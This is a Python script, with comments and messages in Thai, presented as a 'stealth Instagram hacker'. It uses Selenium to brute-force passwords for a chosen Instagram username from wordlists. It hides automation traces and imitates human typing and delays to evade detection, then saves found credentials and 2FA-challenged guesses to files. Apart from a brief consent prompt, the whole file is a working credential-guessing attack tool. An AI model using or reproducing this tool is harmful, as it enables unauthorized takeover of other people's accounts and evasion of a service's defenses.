#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🚀 Simple Stealth Hacker - แก้ไขปัญหา Chrome compatibility
Instagram hacking ด้วย Selenium แบบ stealth ที่ใช้งานได้จริง
"""

import time
import random
import json
import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

class SimpleStealthHacker:
    def __init__(self):
        self.driver = None
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]
        
    def setup_stealth_chrome(self):
        """ตั้งค่า Chrome แบบ stealth (compatible version)"""
        print("🕷️ กำลังตั้งค่า Stealth Chrome...")
        
        try:
            options = Options()
            
            # Basic stealth options
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_argument('--disable-extensions')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--disable-automation')
            options.add_argument('--disable-infobars')
            
            # Random user agent
            user_agent = random.choice(self.user_agents)
            options.add_argument(f'--user-agent={user_agent}')
            
            # Random window size
            width = random.randint(1200, 1920)
            height = random.randint(800, 1080)
            options.add_argument(f'--window-size={width},{height}')
            
            # Create driver
            self.driver = webdriver.Chrome(options=options)
            
            # Execute anti-detection scripts
            self.hide_automation_traces()
            
            print("✅ Stealth Chrome พร้อมใช้งาน")
            return True
            
        except Exception as e:
            print(f"❌ Error setting up Chrome: {e}")
            return False
    
    def hide_automation_traces(self):
        """ซ่อนร่องรอยของ automation"""
        stealth_scripts = [
            "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})",
            "window.chrome = {runtime: {}}",
            "Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]})",
            "Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']})"
        ]
        
        for script in stealth_scripts:
            try:
                self.driver.execute_script(script)
            except:
                pass
    
    def human_delay(self, min_sec=2, max_sec=8):
        """หน่วงเวลาแบบมนุษย์"""
        delay = random.uniform(min_sec, max_sec)
        print(f"⏳ รอ {delay:.1f} วินาที...")
        time.sleep(delay)
    
    def human_typing(self, element, text):
        """พิมพ์ข้อความแบบมนุษย์"""
        element.clear()
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(0.05, 0.3))
    
    def stealth_login(self, username, password):
        """ลอง login แบบ stealth"""
        try:
            print(f"🎯 กำลังลอง: {username} | {password}")
            
            # ไปที่หน้า login
            self.driver.get("https://www.instagram.com/accounts/login/")
            
            # รอให้หน้าโหลด
            WebDriverWait(self.driver, 15).until(
                EC.presence_of_element_located((By.NAME, "username"))
            )
            
            self.human_delay(2, 5)
            
            # หา elements
            username_field = self.driver.find_element(By.NAME, "username")
            password_field = self.driver.find_element(By.NAME, "password")
            
            # พิมพ์ username
            self.human_typing(username_field, username)
            self.human_delay(1, 3)
            
            # พิมพ์ password
            self.human_typing(password_field, password)
            self.human_delay(2, 4)
            
            # คลิก login
            login_button = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
            login_button.click()
            
            # รอผลลัพธ์
            time.sleep(8)
            
            # ตรวจสอบผลลัพธ์
            current_url = self.driver.current_url
            page_source = self.driver.page_source.lower()
            
            if "challenge" in current_url or "two_factor" in current_url:
                print("🔐 ต้องการ 2FA - อาจเป็นรหัสผ่านที่ถูกต้อง!")
                return "challenge"
            elif "login" not in current_url and "instagram.com/" in current_url:
                print("✅ เข้าสู่ระบบสำเร็จ!")
                return "success"
            elif any(word in page_source for word in ["error", "incorrect", "wrong", "invalid"]):
                print("❌ รหัสผ่านผิด")
                return "failed"
            else:
                print("🤔 ผลลัพธ์ไม่ชัดเจน - ลองต่อ")
                return "unknown"
                
        except TimeoutException:
            print("⏰ Timeout - เชื่อมต่อช้า")
            return "timeout"
        except Exception as e:
            print(f"❌ Error: {e}")
            return "error"
    
    def run_attack(self, target, wordlist_file):
        """รันการโจมตี"""
        print("🕷️ เริ่ม Simple Stealth Attack")
        print("="*50)
        
        # Setup browser
        if not self.setup_stealth_chrome():
            return False
        
        # โหลด wordlist
        try:
            with open(wordlist_file, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"📚 โหลด {len(passwords)} passwords จาก {wordlist_file}")
        except Exception as e:
            print(f"❌ ไม่สามารถโหลด wordlist: {e}")
            return False
        
        # เริ่มโจมตี
        success_found = False
        for i, password in enumerate(passwords, 1):
            if i > 20:  # จำกัดเพื่อป้องกัน ban
                print("⚠️ หยุดที่ 20 attempts เพื่อความปลอดภัย")
                break
                
            print(f"\n🎯 Attempt {i}/{min(len(passwords), 20)}: {target} | {password}")
            
            result = self.stealth_login(target, password)
            
            if result == "success":
                print(f"🎉 พบรหัสผ่าน: {target}:{password}")
                self.save_success(target, password)
                success_found = True
                break
            elif result == "challenge":
                print("🔐 ต้องการ 2FA - บันทึกเป็นผลลัพธ์ที่น่าสนใจ")
                self.save_challenge(target, password)
            
            # หน่วงเวลาระหว่างการลอง
            self.human_delay(8, 15)
        
        # ปิด browser
        if self.driver:
            self.driver.quit()
        
        return success_found
    
    def save_success(self, username, password):
        """บันทึกผลสำเร็จ"""
        result = {
            "username": username,
            "password": password,
            "status": "success",
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "method": "simple_stealth"
        }
        
        with open('stealth_success.json', 'w', encoding='utf-8') as f:
            json.dump(result, f, indent=4, ensure_ascii=False)
        
        print(f"💾 บันทึกผลลัพธ์ใน stealth_success.json")
    
    def save_challenge(self, username, password):
        """บันทึกผลลัพธ์ที่ต้องการ 2FA"""
        result = {
            "username": username,
            "password": password,
            "status": "requires_2fa",
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "method": "simple_stealth"
        }
        
        with open('stealth_challenge.json', 'w', encoding='utf-8') as f:
            json.dump(result, f, indent=4, ensure_ascii=False)
        
        print(f"💾 บันทึก 2FA challenge ใน stealth_challenge.json")

def main():
    print("🕷️ Simple Stealth Instagram Hacker")
    print("="*50)
    print("🎯 Features:")
    print("  • Chrome stealth mode")
    print("  • Human-like behavior")
    print("  • Rate limiting protection")
    print("  • Anti-detection")
    print()
    
    target = input("🎯 ใส่ Instagram username เป้าหมาย: ").strip()
    if not target:
        print("❌ ต้องใส่ username")
        return
    
    print("\n📚 Wordlist ที่มี:")
    print("1. whatilove1728.txt (26 passwords)")
    print("2. alx_trading_passwords.txt (2,568 passwords)")
    print("3. common_passwords.txt (632 passwords)")
    
    choice = input("\n🤔 เลือก wordlist (1-3): ").strip()
    wordlist_map = {
        "1": "whatilove1728.txt",
        "2": "alx_trading_passwords.txt",
        "3": "common_passwords.txt"
    }
    
    if choice not in wordlist_map:
        print("❌ เลือก 1-3 เท่านั้น")
        return
    
    wordlist = wordlist_map[choice]
    
    # เตือนด้านจริยธรรม
    print("\n⚠️ คำเตือน: ใช้เฉพาะกับบัญชีที่คุณเป็นเจ้าของหรือได้รับอนุญาต")
    confirm = input("ยืนยันการใช้งาน (yes/no): ").strip().lower()
    
    if confirm != 'yes':
        print("❌ ยกเลิกการใช้งาน")
        return
    
    # เริ่มโจมตี
    hacker = SimpleStealthHacker()
    success = hacker.run_attack(target, wordlist)
    
    if success:
        print("\n🎉 การโจมตีสำเร็จ!")
    else:
        print("\n❌ ไม่พบรหัสผ่านที่ถูกต้อง")

if __name__ == "__main__":
    main()
